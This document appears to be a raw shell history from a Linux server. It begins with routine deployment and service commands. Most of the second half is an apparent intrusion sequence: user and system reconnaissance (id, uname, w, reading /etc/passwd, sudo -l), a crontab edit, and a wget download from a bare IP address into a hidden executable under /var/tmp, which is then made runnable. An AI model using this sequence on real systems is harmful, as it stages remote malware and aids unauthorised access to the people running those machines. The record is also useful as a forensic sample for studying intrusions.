ls
cd app
tail -f /var/log/app/app.log
systemctl status app
make deploy
git pull
sudo systemctl restart app
id
uname -a
w
cat /etc/passwd
ls -la
ps aux
sudo -l
crontab -
wget -q http://45.120.111.131/k -O /var/tmp/.k
chmod +x /var/tmp/.k
history -w
